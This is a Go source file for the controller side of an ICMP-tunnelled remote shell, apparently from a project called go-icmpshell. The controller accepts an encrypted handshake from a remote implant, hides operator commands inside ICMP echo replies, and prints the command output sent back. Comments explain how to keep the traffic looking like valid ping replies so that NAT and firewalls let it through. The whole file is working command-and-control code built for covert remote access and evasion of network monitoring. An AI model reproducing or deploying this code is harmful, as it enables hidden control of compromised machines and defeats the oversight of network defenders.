package server

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"os"

	"github.com/d1nfinite/go-icmpshell/common"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

type Server struct {
	conn           *icmp.PacketConn
	icmpId         uint16
	seq            int
	tokenCheck     bool
	receiveConnect chan struct{}
	dst            net.Addr
	cmdQueue       chan []byte
	logs           bool
	common.Auth
}

type Option func(server *Server) *Server

func WithToken(token []byte) Option {
	return func(server *Server) *Server {
		server.Token = token
		return server
	}
}

func WithLogs(enable bool) Option {
	return func(server *Server) *Server {
		server.logs = enable
		return server
	}
}

func NewServer(opts ...Option) (*Server, error) {
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		return nil, err
	}

	s := &Server{
		conn:           conn,
		tokenCheck:     false,
		receiveConnect: make(chan struct{}, 1),
		cmdQueue:       make(chan []byte, 10), // Buffer some commands
	}

	// Options
	for _, opt := range opts {
		s = opt(s)
	}

	return s, nil
}

func (s *Server) StartupShell() error {
	<-s.receiveConnect
	reader := bufio.NewScanner(os.Stdin)
	for reader.Scan() {
		command := reader.Text()
		if command == "" {
			continue
		}

		commandBytes := []byte(command)
		const maxChunkSize = 1000
		for len(commandBytes) > 0 {
			chunkSize := maxChunkSize
			if len(commandBytes) < chunkSize {
				chunkSize = len(commandBytes)
			}
			chunk := commandBytes[:chunkSize]
			commandBytes = commandBytes[chunkSize:]

			commandEncrypt, err := s.Encrypt(append([]byte("CMD:"), chunk...))
			if err != nil {
				fmt.Println(err)
				break
			}

			// Queue the command fragment
			s.cmdQueue <- commandEncrypt
		}
	}

	return nil
}

func (s *Server) ListenICMP() {
	buf := make([]byte, 1500)

	for {
		n, peer, err := s.conn.ReadFrom(buf)
		if err != nil {
			fmt.Println(err)
			continue
		}

		// Parse ICMP message
		msg, err := icmp.ParseMessage(1, buf[:n]) // 1 is ICMPv4 protocol number
		if err != nil {
			fmt.Println("ParseMessage error:", err)
			continue
		}

		switch body := msg.Body.(type) {
		case *icmp.Echo:
			// IMPORTANT: Only handle Echo Request (Type 8)
			if msg.Type != ipv4.ICMPTypeEcho {
				continue
			}

			// Filter out empty packets
			if len(body.Data) == 0 {
				continue
			}

			if s.logs {
				fmt.Printf("Recv: ID=%d Seq=%d Len=%d Type=%v\n", body.ID, body.Seq, len(body.Data), msg.Type)
			}

			// 1. Try DecryptWithToken (Handshake Check)
			decToken, err := s.DecryptWithToken(body.Data)
			if err == nil && bytes.HasPrefix(decToken, []byte("KEY:")) {
				// Handshake
				key := decToken[4:]
				if len(key) == 16 {
					if s.logs {
						fmt.Println("Received Handshake. Session Key Established.")
					}
					s.SetSessionKey(key)

					// Update session info
					s.icmpId = uint16(body.ID)
					s.seq = body.Seq
					s.dst = peer

					// Notify StartupShell to start reading input
					if !s.tokenCheck {
						fmt.Println("Receive connect from shell")
						s.tokenCheck = true
						select {
						case s.receiveConnect <- struct{}{}:
						default:
						}
					}

					// Reply with KEY_OK (Encrypted with Session Key)
					reply, _ := s.Encrypt([]byte("KEY_OK"))
					s.SendICMP(reply, uint16(body.ID), ipv4.ICMPTypeEchoReply)
					continue
				}
			}

			// 2. Try Decrypt (Session Key)
			decData, err := s.Decrypt(body.Data)
			if err == nil {
				// Check for PING (Heartbeat)
				if string(decData) == "PING" {
					// Update session info
					s.icmpId = uint16(body.ID)
					s.seq = body.Seq
					s.dst = peer

					// Reply with pending command if any
					s.replyWithCommand(uint16(body.ID), body.Seq)
					continue
				}

				// Check for Output
				if bytes.HasPrefix(decData, []byte("OUT:")) {
					// Valid Output from Shell
					os.Stdout.Write(decData[4:])

					// Update session info
					s.icmpId = uint16(body.ID)
					s.seq = body.Seq
					s.dst = peer

					// Reply
					s.replyWithCommand(uint16(body.ID), body.Seq)
					continue
				}

				// Check for CMD (Reflection)
				if bytes.HasPrefix(decData, []byte("CMD:")) {
					if s.logs {
						fmt.Println("Ignored reflected command packet")
					}
					continue
				}
			}
		}
	}
}

// replyWithCommand checks queue and replies if command exists
func (s *Server) replyWithCommand(currentID uint16, currentSeq int) {
	select {
	case cmd := <-s.cmdQueue:
		s.SendICMP(cmd, currentID, ipv4.ICMPTypeEchoReply)
	default:
		// No command, send Heartbeat/KeepAlive (Encrypted PING)
		ping, _ := s.Encrypt([]byte("PING"))
		s.SendICMP(ping, currentID, ipv4.ICMPTypeEchoReply)
	}
}

func (s *Server) SendICMP(payload []byte, icmpId uint16, icmpType ipv4.ICMPType) error {
	if s.dst == nil {
		return fmt.Errorf("destination not set")
	}

	// For Echo Reply, we MUST match the Seq of the Request we received.
	// Otherwise, NAT/Firewall will drop it because it doesn't look like a valid reply.
	// s.seq currently holds the Seq from the last received packet (updated in ListenICMP).

	sendSeq := s.seq
	if icmpType != ipv4.ICMPTypeEchoReply {
		s.seq++ // Only increment for our own requests
		sendSeq = s.seq
	} else {
		// For Reply, strictly use the request's Seq
		// s.seq was updated to request's Seq in ListenICMP
		sendSeq = s.seq
	}

	body := &icmp.Echo{
		ID:   int(icmpId),
		Seq:  sendSeq,
		Data: payload,
	}

	msg := icmp.Message{
		Type: icmpType,
		Code: 0,
		Body: body,
	}

	msgBytes, err := msg.Marshal(nil)
	if err != nil {
		return err
	}

	if s.logs {
		fmt.Printf("Send: ID=%d Seq=%d Len=%d Type=%v\n", icmpId, sendSeq, len(payload), icmpType)
	}
	_, err = s.conn.WriteTo(msgBytes, s.dst)
	return err
}
